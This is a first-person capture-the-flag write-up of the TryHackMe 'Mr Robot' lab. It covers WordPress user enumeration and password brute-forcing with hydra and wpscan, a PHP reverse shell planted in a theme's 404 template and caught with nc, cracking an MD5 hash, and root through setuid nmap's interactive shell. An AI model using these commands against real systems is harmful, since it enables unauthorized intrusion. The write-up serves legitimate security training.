# Mr Robot
[Play](https://tryhackme.com/room/mrrobot)

## Recon

```
❯ nmap -sC -sV -A -T4 10.10.91.137
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-05 21:55 EST
Nmap scan report for 10.10.91.137
Host is up (0.31s latency).
Not shown: 997 filtered ports
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http Apache httpd
|_http-server-header: Apache
|_http-title: 400 Bad Request
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.55 seconds
```

```
❯ gobuster dir -u 10.10.91.137 -w "/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt" -x "html,php,txt"
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.91.137
[+] Threads:        10
[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     html,php,txt
[+] Timeout:        10s
===============================================================
2021/03/05 21:57:18 Starting gobuster
===============================================================
/index.html (Status: 200)
/index.php (Status: 301)
/images (Status: 301)
/blog (Status: 301)
/sitemap (Status: 200)
/rss (Status: 301)
/login (Status: 302)
/0 (Status: 301)
/feed (Status: 301)
/video (Status: 301)
/image (Status: 301)
/atom (Status: 301)
/wp-content (Status: 301)
/admin (Status: 301)
/audio (Status: 301)
/intro (Status: 200)
/wp-login (Status: 200)
/wp-login.php (Status: 200)
/css (Status: 301)
/rss2 (Status: 301)
/license (Status: 200)
/license.txt (Status: 200)
/wp-includes (Status: 301)
/js (Status: 301)
/wp-register.php (Status: 301)
/Image (Status: 301)
/wp-rss2.php (Status: 301)
/rdf (Status: 301)
/page1 (Status: 301)
/readme (Status: 200)
/readme.html (Status: 200)
/robots (Status: 200)
/robots.txt (Status: 200)
```

`http://10.10.91.137/0/` shows a blog page. We also see the login option, redirecting us to `/wp-login.php`. No common creds work.

Looking around more, we have `/license.txt` which has `what you do just pull code from Rapid9 or some s@#% since when did you become a script kitty?` lmao, and `/readme` showing: `I like where you head is at. However I'm not going to help you.`

However, in `/robots`, I get:
![](https://i.imgur.com/TkgmcyU.png)

Makes sense for it to be in robots, since its about Mr robot XD. Going on this theme, we get `fscoiety.dic` which looks to be either usernames or passwords. On a whim, I decided to test the user `Elliot` on the `/wp-login` page. The password is obviously wrong, but renetering it for reset password, we see that its correct!

![](https://i.imgur.com/K5nU69N.png)

For obvious reasons, this fails, otherwise there would be no way to enter the box once the password is reset. Thus, we have the list, `fscoiety.dic`, which is password list!

Let's fireup `hydra` to start with the bruteforce attack. But we need to know how to request is sent exactly. So, `burpsuite` time!


```
POST /wp-login.php HTTP/1.1
...

log=Elliot&pwd=Elliot&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.91.137%2Fwp-admin%2F&testcookie=1
```

Okay. this is how it looks. Time for bruteforcing!

Use the command: `❯ hydra -l Elliot -P ../fsocity.dic 10.10.91.137 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password you entered for the username"`

Explaination:
- `hydra` is the tool we use (smh)
- `-l` flag indicates only one username for (l)ogin. `-L` for a list of it
- `-P` flag for a password list. `-p` for a single password
- `http-post-form` is self explainatory. it requires 3 things, separated by `:`s
    - exact path to where you want to attack, in our case is `/wp-login.php`
    - the syntax and style of `username:password`
    - substring of the error message of wrong password (to thus differentiate between right and wrong)

Since this is bruteforce, it'll take time to execute. add `-t` flag to specify number of threads, default being 16.

At this point, I have to mention that I spent a long long time to make it work. It did not. One thing which I should have done the first was to remove duplicates. There's also a tool called `wpscan`. Let's try it out.


```
❯ wpscan --url 10.10.91.137 -t 64 -U Elliot -P ~/Desktop/Work/Pen-Testing/fsocity.dic
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.12
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://10.10.91.137/ [10.10.91.137]
[+] Started: Sat Mar  6 00:14:02 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache
 |  - X-Mod-Pagespeed: 1.9.32.3-4523
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://10.10.91.137/robots.txt
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.91.137/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] The external WP-Cron seems to be enabled: http://10.10.91.137/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.3.1 identified (Insecure, released on 2015-09-15).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.10.91.137/47e29f4.html, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=4.3.1'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.10.91.137/47e29f4.html, Match: 'WordPress 4.3.1'

[+] WordPress theme in use: twentyfifteen
 | Location: http://10.10.91.137/wp-content/themes/twentyfifteen/
 | Last Updated: 2020-12-09T00:00:00.000Z
 | Readme: http://10.10.91.137/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 2.8
 | Style URL: http://10.10.91.137/wp-content/themes/twentyfifteen/style.css?ver=4.3.1
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen/
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.91.137/wp-content/themes/twentyfifteen/style.css?ver=4.3.1, Match: 'Version: 1.3'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:03 <========================================================> (22 / 22) 100.00% Time: 00:00:03

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc Multicall against 1 user/s
[SUCCESS] - Elliot / {hmmmmmmmmmmmmmmmmmm}                                                                                                       
All Found                                                                                                                            
Progress Time: 00:00:46 <======                                                                      > (2 / 22)  9.09%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: Elliot, Password: {hmmmmmmmmmmmmmmmmmm}

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpscan.com/register

[+] Finished: Sat Mar  6 00:15:09 2021
[+] Requests Done: 73
[+] Cached Requests: 6
[+] Data Sent: 16.995 KB
[+] Data Received: 16.491 MB
[+] Memory used: 230.895 MB
[+] Elapsed time: 00:01:06
```

I am very very impressed by the scanner. Not only did it find that `/robots.txt` file fairly quicky, it also gave us the password in a minute! 

## Foothold
To get a foothold, we need to figure what we can do with `WordPress`.

`WordPress 4.3.1 running Twenty Fifteen theme.` I did not find issues with this version, that are direct in any way. What I found instead is to mess with the `404` page.

in `Appearace>Editor>404 Template`, we get the template page for 404. Let's put the `php-reverse-shell.php` file in there. Find this by using the `locate` command, or getting one from github.

Save it, and have `nc` running. Now, go to a non-existent page like `/haha`. 

```
❯ nc -lnvp 1337
listening on [any] 1337 ...
connect to [10.8.150.214] from (UNKNOWN) [10.10.91.137] 45401
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 05:27:10 up  2:34,  0 users,  load average: 0.00, 0.17, 1.85
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

we are in!

===

In `/home/robot`, 
```
$ ls
key-2-of-3.txt
password.raw-md5
$ cat key-2-of-3.txt
cat: key-2-of-3.txt: Permission denied
```

very cute. 

## Priv Esc

Let's first get a proper shell
```
$ python3 --version
Python 3.4.0
$ python3 -c "import pty; pty.spawn('/bin/bash')"
daemon@linux:/home/robot$ 
```

```
daemon@linux:/home/robot$ cat password.raw-md5
cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
```

This looks fairly small, and no salt. Let's use an online tool [hashes.com](https://hashes.com/en/decrypt/hash)


And we have the creds! (also, very nice password XD)

```
daemon@linux:/home/robot$ su robot
su robot
Password: {hmmmmmmmmmmmmmmmmmm}

robot@linux:~$ 
```

```
robot@linux:~$ sudo -l
sudo -l
[sudo] password for robot: {hmmmmmmmmmmmmmmmmmm}

Sorry, user robot may not run sudo on linux.
```

We can get the key 2 though! So priv esc to root time!

I tried getting the `linpeas.sh` file from my machine, by setting up a `httpserver`, but that did not work. Only other way is to manually find issues.

If you have seen other priv-escs, all, or all I have seen, exploit something related to the `set-uid` bit.

Let's find the files having those, using: `robot@linux:~$ find / -perm -u=s > /dev/null`


```
robot@linux:~$ find / -perm -u=s -type f 2>/dev/null      
find / -perm -u=s -type f 2>/dev/null
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown
```

only `nmap` looks any interesting. [This article](https://pentestlab.blog/category/privilege-escalation/) explains what I am trying to replicate here.

```
robot@linux:~$ nmap -V
nmap -V

nmap version 3.81 ( http://www.insecure.org/nmap/ )
```

website name as insecure :D

```
robot@linux:~$ nmap --interactive
nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> ls
ls
Unknown command (ls) -- press h <enter> for help
nmap> !sh
!sh
# ls
ls
key-2-of-3.txt  password.raw-md5
# whoami
whoami
root
```

pwned!

